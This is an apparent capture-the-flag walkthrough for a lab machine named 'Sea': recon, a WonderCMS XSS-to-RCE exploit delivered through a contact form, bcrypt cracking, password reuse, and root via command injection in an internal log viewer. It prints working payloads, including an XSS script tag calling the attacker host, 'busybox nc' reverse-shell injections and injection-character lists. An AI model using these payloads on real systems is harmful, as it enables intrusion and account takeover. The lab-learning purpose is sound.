# Sea - Easy

```sh
sudo vim /etc/hosts
# added sea.htb

nmap -T4 -p- -A -Pn -v sea.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
    * 80/tcp - http - Apache httpd 2.4.41

* the webpage on port 80 is a biking company website; the source code includes a comment that mentions 'admin CSS', indicating there could be an admin page

* there is a link on the webpage for participation, that leads to a contact form at '/contact.php'

* web enumeration:

    ```sh
    gobuster dir -u http://sea.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html.js,md -t 25
    # dir scan with small wordlist

    ffuf -c  -u 'http://sea.htb' -H 'Host: FUZZ.sea.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 582 -s
    # subdomain scan
    ```

* ```gobuster``` shows several false positives, and we get a few true positives:

    * /0 - homepage
    * /404 - 404 page, no info
    * /data - 403 Forbidden
    * /messages - 403 Forbidden
    * /plugins - 403 Forbidden
    * /themes - 403 Forbidden

* the directories found seem to indicate this could be using a CMS and/or having an admin page, but we are unable to find any other pages

* tools like [cmseek](https://github.com/Tuhinshubhra/CMSeeK) can be used, but they do not show any CMS

* we can try directory scanning for the enumerated directories - we can also use ```feroxbuster``` for recursive and in-depth scanning:

    ```sh
    feroxbuster -u http://sea.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,js,md --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    ```

* ```feroxbuster``` detects more directories like '/themes/bike'

* Googling for 'CMS bike theme' leads us to [the 'bike' theme in WonderCMS](https://github.com/robiso/bike) - this confirms the webpage is running on WonderCMS

* the repo shows that a file 'version' exists for each theme - and if we navigate to 'http://sea.htb/themes/bike/version', we get the version 3.2.0

* Googling for exploits related to WonderCMS 3.2.0 leads to multiple exploits for [CVE-2023-41425 - a RCE exploit in WonderCMS 3.4.2](https://github.com/Tea-On/CVE-2023-41425-RCE-WonderCMS-4.3.2)

* checking the exploit details show that they refer an example login URL at '/loginURL' - if we check the page in our case, we get a login page with a password field - trying default and common passwords do not work

* the exploit generates a XSS script file, for reflected XSS, and provides the malicious link; but this needs a logged in user to interact with the link

* we can check the contact form for any such activity as it has multiple fields - name, email, age, country and website - out of which, only the email and age fields are validated

* as the contact form has a website field, one of the first things that we can check for is SSRF injection

* we can setup a Python server using ```python3 -m http.server``` and in the website field, we can refer our server using the value 'http://10.10.14.95:8000'

* within a minute, we get a response on our server - this shows that someone is checking the website input field, and it is prone to SSRF injection

* we can combine the SSRF injection in the contact form with the CVE-2023-41425 exploit, such that the logged in user clicks on the malicious XSS script, and we get RCE:

    * download [the exploit](https://github.com/Tea-On/CVE-2023-41425-RCE-WonderCMS-4.3.2/blob/main/exploit_CVE-2023-41425.py) and [the reverse shell file](https://github.com/Tea-On/CVE-2023-41425-RCE-WonderCMS-4.3.2/blob/main/reverseShell.php) from the repo

    * modify the reverse shell to update the IP and port values:

        ```sh
        vim reverseShell.php
        ```
    
    * run the exploit script:

        ```sh
        python3 exploit_CVE-2023-41425.py -u http://sea.htb/loginURL -H 10.10.14.95 -p 4444 -r reverseShell.php
        ```
    
    * the exploit starts the Python HTTP server on port 3000 and provides the XSS payload - ```http://sea.htb/index.php?page=loginURL?"><script src="http://10.10.14.95:3000/script.js"></script>```

    * start a listener using ```nc -nvlp 4444```

    * submit the XSS payload in the contact form's website field, and within a moment, the script and revshell files are fetched, and we get reverse shell

* in reverse shell:

    ```sh
    id
    # www-data

    pwd
    # '/'

    ls -la /

    ls -la /home
    # we have users 'amay' and 'geo'

    ls -la /home/amay
    
    ls -la /home/geo

    ls -la /var/www
    # check web files

    ls -la /var/www/sea

    cat /var/www/sea/data/database.js
    # contains encrypted password
    ```

* the 'database.js' file in the web directory contains an encrypted password - "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q"

* hash identifier tools show that it is using bcrypt hash format, supported by ```hashcat``` mode 3200

* we can try to crack the hash:

    ```sh
    vim seahash
    # paste hash

    hashcat -m 3200 seahash /usr/share/wordlists/rockyou.txt
    # error - "no hashes loaded"
    ```

* checking the hash again, we can see that it has 62 characters; but [the example hash from hashcat docs for bcrypt](https://hashcat.net/wiki/doku.php?id=example_hashes) contains only 60 characters

* the hash format contains two instances of ```\/``` - indicating that the slash is used for escaping it - so we need to correct our hash format by removing the backward slash used to escape the forward slash

* with the corrected bcrypt hash - "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q" - we can try cracking the hash again:

    ```sh
    vim seahash
    # remove the backslashes

    hashcat -m 3200 seahash /usr/share/wordlists/rockyou.txt
    ```

* this time, ```hashcat``` works and we get the cleartext 'mychemicalromance' - we can try reusing this password for SSH login as 'amay' or 'geo':

    ```sh
    ssh amay@sea.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # cannot run sudo
    ```

* we can use ```linpeas``` for basic enum - fetch script from attacker:

    ```sh
    wget http://10.10.14.95:3000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-190-generic, Ubuntu 20.04.6
    * cronjob using ```/opt/google/chrome/cron/google-chrome```
    * local listeners on port 8080 and 48947

* if we try checking the service on port 8080 using ```curl http://localhost:8080```, we get a message 'unauthorized access'

* we can use SSH local port forwarding to access the service on port 8080 from our machine:

    ```sh
    # on attacker
    ssh -L 1234:localhost:8080 amay@sea.htb
    ```

* now we can access the internal webpage on port 1234 on attacker machine

* navigating to 'http://localhost:1234', we get a basic authorization pop-up; common creds like 'admin:admin' or 'admin:password' do not work

* if we try using the password 'mychemicalromance' with usernames like 'admin', 'amay' or 'geo' - the creds 'amay:mychemicalromance' works here

* the page is used for a 'System Monitor' and is in development; it has the following features:

    * shows disk usage
    * provides system management features:

        * clean system with apt
        * update system
        * clear auth.log
        * clear access.log
    
    * analyze log file - with a dropdown having options 'access.log' and 'auth.log'

* we can test each of the features with Burp Suite intercepting the requests, to check how the requests to the system work

* checking the 'analyze log file' option, if we use it to analyze the file 'access.log' for example, Burp Suite shows that it uses a POST request with the data 'log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log='; the webpage then prints the contents of the log file, and also detects suspicious traffic patterns

* the 'log_file' parameter uses the URL-encoded path ```/var/log/apache2/access.log```

* we can test for command injection points here, as it is very likely a command is being executed to read the log files - test for the following characters, and their URL-encoded forms:

    * ```;``` (```%3b```)
    * ```\n``` (```%0a```)
    * ```&``` (```%26```)
    * ```|``` (```%7c```)
    * ```&&``` (```%26%26```)
    * ```||``` (```%7c%7c```)
    * `` (```%60%60```)
    * ```$()``` (```%24%28%29```)

* if we check for command injection using semicolon (```;```) in the POST request data, we are able to get command execution using the following injection:

    ```sh
    log_file=/var/log/apache2/access.log;ping+-c+4+10.10.14.95&analyze_log=
    ```

* we are able to verify this using ```sudo tcpdump -i tun0 icmp``` on our attacker machine, and when the above data is sent, we get ICMP packets from the target, indicating that the ```ping``` command is executed

* we can use this to get RCE - setup another listener using ```nc -nvlp 5555``` - and execute the following revshell one-liner command with the command injection vuln for the 'log_file' parameter:

    ```sh
    log_file=/var/log/apache2/access.log;busybox+nc+10.10.14.95+5555+-e+sh&analyze_log=
    ```

* we get reverse shell - it times out after a while, but we can execute commands:

    ```sh
    id
    # root

    cat /root/root.txt
    # root flag
    ```
